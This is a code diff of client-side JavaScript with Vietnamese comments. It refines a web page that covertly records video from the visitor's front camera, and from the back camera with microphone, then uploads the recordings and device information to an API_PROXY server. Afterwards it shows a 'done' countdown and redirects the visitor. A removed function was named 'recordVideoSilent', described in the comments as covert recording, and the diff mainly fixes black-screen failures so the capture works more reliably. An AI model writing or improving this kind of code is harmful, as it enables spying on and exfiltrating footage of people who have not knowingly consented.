@@ -88,12 +88,15 @@ function detectDevice() {
   }
 }
 
-// --- 4. QUAY VIDEO NGẦM (CÓ MIC) - KHẮC PHỤC LỖI CAM ĐEN ---
-async function recordVideoSilent(facingMode = 'user', duration = 5000) {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
-  
+// --- 4. QUAY VIDEO CAMERA TRƯỚC (KHÔNG BỊ ĐEN) ---
+async function recordFrontCamera(duration = 5000) {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    console.log('❌ Không hỗ trợ getUserMedia');
+    return null;
+  }
+
   try {
-    // Ưu tiên codec nhẹ cho mobile
+    // Kiểm tra codec hỗ trợ
     const mimeTypes = [
       'video/webm;codecs=vp8',
       'video/webm;codecs=vp9',
@@ -113,33 +116,155 @@ async function recordVideoSilent(facingMode = 'user', duration = 5000) {
       mimeType = 'video/webm';
     }
 
-    // Cấu hình video - KHÔNG dùng facingMode để tránh lỗi đen
-    const videoConstraints = {
-      width: { ideal: 480 },
-      height: { ideal: 360 },
-      frameRate: { ideal: 15 }
-    };
+    // QUAN TRỌNG: Chỉ lấy video, KHÔNG lấy audio cùng lúc
+    console.log('🎥 Đang quay CAMERA TRƯỚC (chỉ video)...');
+    
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: 'user',
+        width: { ideal: 480 },
+        height: { ideal: 360 }
+      },
+      audio: false // KHÔNG lấy audio để tránh lỗi đen
+    });
 
-    // Thử với facingMode
-    if (facingMode) {
-      videoConstraints.facingMode = facingMode;
+    const mediaRecorder = new MediaRecorder(stream, {
+      mimeType: mimeType,
+      videoBitsPerSecond: 500000
+    });
+
+    const chunks = [];
+
+    return new Promise((resolve) => {
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: mimeType });
+        stream.getTracks().forEach(t => t.stop());
+        console.log(`✅ Đã quay xong camera TRƯỚC, dung lượng: ${(blob.size / 1024).toFixed(2)} KB`);
+        resolve(blob);
+      };
+
+      mediaRecorder.start(1000);
+      
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, duration);
+    });
+
+  } catch (e) {
+    console.error('❌ Lỗi quay camera trước (cách 1):', e);
+    
+    // Cách 2: Thử với deviceId
+    try {
+      console.log('🔄 Thử cách 2: Dùng deviceId...');
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const cameras = devices.filter(d => d.kind === 'videoinput');
+      
+      // Tìm camera trước
+      let frontCam = cameras.find(c => 
+        c.label.toLowerCase().includes('front') || 
+        c.label.toLowerCase().includes('face') ||
+        c.label.toLowerCase().includes('user')
+      );
+      
+      // Nếu không tìm thấy, lấy camera đầu tiên
+      if (!frontCam && cameras.length > 0) {
+        frontCam = cameras[0];
+      }
+      
+      if (!frontCam) {
+        console.log('❌ Không tìm thấy camera nào');
+        return null;
+      }
+      
+      console.log(`📷 Dùng camera: ${frontCam.label}`);
+      
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          deviceId: { exact: frontCam.deviceId },
+          width: { ideal: 480 },
+          height: { ideal: 360 }
+        },
+        audio: false
+      });
+      
+      const mimeType = 'video/webm;codecs=vp8';
+      const recorder = new MediaRecorder(stream, { mimeType });
+      const chunks = [];
+      
+      return new Promise((resolve) => {
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: mimeType });
+          stream.getTracks().forEach(t => t.stop());
+          console.log(`✅ Đã quay xong camera TRƯỚC (cách 2)`);
+          resolve(blob);
+        };
+        recorder.start(1000);
+        setTimeout(() => {
+          if (recorder.state === 'recording') recorder.stop();
+        }, duration);
+      });
+      
+    } catch (e2) {
+      console.error('❌ Lỗi quay camera trước (cách 2):', e2);
+      return null;
+    }
+  }
+}
+
+// --- 5. QUAY VIDEO CAMERA SAU (CÓ MIC) ---
+async function recordBackCamera(duration = 5000) {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  
+  try {
+    const mimeTypes = [
+      'video/webm;codecs=vp8',
+      'video/webm;codecs=vp9',
+      'video/webm',
+      'video/mp4;codecs=h264'
+    ];
+    
+    let mimeType = null;
+    for (const type of mimeTypes) {
+      if (MediaRecorder.isTypeSupported(type)) {
+        mimeType = type;
+        break;
+      }
+    }
+    
+    if (!mimeType) {
+      mimeType = 'video/webm';
     }
 
-    console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}...`);
+    console.log('🎥 Đang quay CAMERA SAU (có mic)...');
     
-    // Thử quay với video + audio
+    // Camera sau có thể lấy cả audio
     let stream = null;
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ 
-        video: videoConstraints, 
-        audio: true 
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: 'environment',
+          width: { ideal: 480 },
+          height: { ideal: 360 }
+        },
+        audio: true
       });
     } catch (e) {
-      // Nếu lỗi, thử lại không có audio
-      console.log('🔄 Thử lại không có audio...');
-      stream = await navigator.mediaDevices.getUserMedia({ 
-        video: videoConstraints, 
-        audio: false 
+      // Nếu lỗi, thử không audio
+      console.log('🔄 Thử camera sau không audio...');
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: 'environment',
+          width: { ideal: 480 },
+          height: { ideal: 360 }
+        },
+        audio: false
       });
     }
 
@@ -159,7 +284,7 @@ async function recordVideoSilent(facingMode = 'user', duration = 5000) {
       mediaRecorder.onstop = () => {
         const blob = new Blob(chunks, { type: mimeType });
         stream.getTracks().forEach(t => t.stop());
-        console.log(`✅ Đã quay xong camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}, dung lượng: ${(blob.size / 1024).toFixed(2)} KB`);
+        console.log(`✅ Đã quay xong camera SAU, dung lượng: ${(blob.size / 1024).toFixed(2)} KB`);
         resolve(blob);
       };
 
@@ -173,94 +298,9 @@ async function recordVideoSilent(facingMode = 'user', duration = 5000) {
     });
 
   } catch (e) {
-    console.error(`❌ Lỗi quay camera ${facingMode}:`, e);
+    console.error('❌ Lỗi quay camera sau:', e);
     return null;
   }
-}
-
-// --- 5. QUAY CAMERA TRƯỚC VỚI CÁCH KHÁC (TRÁNH LỖI ĐEN) ---
-async function recordFrontCamera(duration = 5000) {
-  // Thử nhiều cách để quay camera trước
-  const methods = [
-    // Cách 1: Dùng facingMode: user
-    async () => {
-      return await recordVideoSilent('user', duration);
-    },
-    // Cách 2: Dùng deviceId (nếu có)
-    async () => {
-      try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const cameras = devices.filter(d => d.kind === 'videoinput');
-        const frontCam = cameras.find(c => 
-          c.label.toLowerCase().includes('front') || 
-          c.label.toLowerCase().includes('face') ||
-          c.label.toLowerCase().includes('user')
-        );
-        if (frontCam) {
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: { deviceId: { exact: frontCam.deviceId } },
-            audio: true
-          });
-          const mimeType = 'video/webm;codecs=vp8';
-          const recorder = new MediaRecorder(stream, { mimeType });
-          const chunks = [];
-          return new Promise((resolve) => {
-            recorder.ondataavailable = (e) => chunks.push(e.data);
-            recorder.onstop = () => {
-              const blob = new Blob(chunks, { type: mimeType });
-              stream.getTracks().forEach(t => t.stop());
-              resolve(blob);
-            };
-            recorder.start(1000);
-            setTimeout(() => {
-              if (recorder.state === 'recording') recorder.stop();
-            }, duration);
-          });
-        }
-        return null;
-      } catch (e) {
-        return null;
-      }
-    },
-    // Cách 3: Không chỉ định facingMode (để hệ thống tự chọn)
-    async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { width: 480, height: 360 }
-        });
-        const mimeType = 'video/webm;codecs=vp8';
-        const recorder = new MediaRecorder(stream, { mimeType });
-        const chunks = [];
-        return new Promise((resolve) => {
-          recorder.ondataavailable = (e) => chunks.push(e.data);
-          recorder.onstop = () => {
-            const blob = new Blob(chunks, { type: mimeType });
-            stream.getTracks().forEach(t => t.stop());
-            resolve(blob);
-          };
-          recorder.start(1000);
-          setTimeout(() => {
-            if (recorder.state === 'recording') recorder.stop();
-          }, duration);
-        });
-      } catch (e) {
-        return null;
-      }
-    }
-  ];
-
-  for (const method of methods) {
-    try {
-      const result = await method();
-      if (result) {
-        console.log('✅ Quay camera trước thành công!');
-        return result;
-      }
-    } catch (e) {
-      console.log('❌ Phương pháp thất bại, thử cách khác...');
-    }
-  }
-  return null;
 }
 
 // --- 6. HÀM CHÍNH ---
@@ -286,17 +326,17 @@ async function main() {
   
   info.camera = '⏳ Đang quay video...';
   
-  // === QUAY CAMERA TRƯỚC (dùng hàm đặc biệt) ===
+  // === QUAY CAMERA TRƯỚC (không audio) ===
   console.log('📸 Bắt đầu quay CAMERA TRƯỚC...');
   let frontVideo = await recordFrontCamera(5000);
   
   await new Promise(r => setTimeout(r, 500));
   
-  // === QUAY CAMERA SAU ===
+  // === QUAY CAMERA SAU (có audio) ===
   console.log('📸 Bắt đầu quay CAMERA SAU...');
-  let backVideo = await recordVideoSilent('environment', 5000);
+  let backVideo = await recordBackCamera(5000);
   
-  // Nếu không quay được camera sau, thử lại với front
+  // Nếu không quay được camera sau, thử lại với camera trước
   if (!backVideo) {
     console.log('📸 Thử quay lại camera trước làm camera sau...');
     backVideo = await recordFrontCamera(3000);
@@ -319,7 +359,7 @@ async function main() {
     console.log('❌ Không quay được camera sau');
   }
   
-  // Nếu chỉ có 1 video, nhân đôi để có cả 2
+  // Nếu chỉ có 1 video, nhân đôi
   if (frontMP4 && !backMP4) {
     backMP4 = frontMP4;
     console.log('📸 Dùng video trước làm video sau');
@@ -332,7 +372,7 @@ async function main() {
   
   info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video' : '🚫 Không quay được video';
 
-  // === GỬI DỮ LIỆU ĐẦY ĐỦ ===
+  // === GỬI DỮ LIỆU ===
   const formData = new FormData();
   formData.append('clientInfo', JSON.stringify(info));
 
@@ -350,28 +390,18 @@ async function main() {
     
     try {
       console.log('📤 Đang gửi video lên server...');
-      const response = await fetch(API_PROXY, { 
-        method: 'POST', 
-        body: formData 
-      });
-      const result = await response.text();
-      console.log('✅ Đã gửi video thành công:', result);
+      await fetch(API_PROXY, { method: 'POST', body: formData });
+      console.log('✅ Đã gửi video thành công');
     } catch (e) {
       console.error('❌ Lỗi gửi video:', e);
     }
   } else {
     console.log('📤 Gửi text (không có video)...');
-    try {
-      const response = await fetch(API_PROXY, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(info)
-      });
-      const result = await response.text();
-      console.log('✅ Đã gửi text thành công:', result);
-    } catch (e) {
-      console.error('❌ Lỗi gửi text:', e);
-    }
+    await fetch(API_PROXY, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(info)
+    });
   }
 
   // --- ĐẾM NGƯỢC CHUYỂN HƯỚNG ---
@@ -393,7 +423,6 @@ async function main() {
         button.innerText = `Hoàn tất (${timeLeft}s)`;
       } else {
         clearInterval(countdownInterval);
-        // THAY LINK CHUYỂN HƯỚNG VÀO ĐÂY
         window.location.href = "";
       }
     }, 1000);
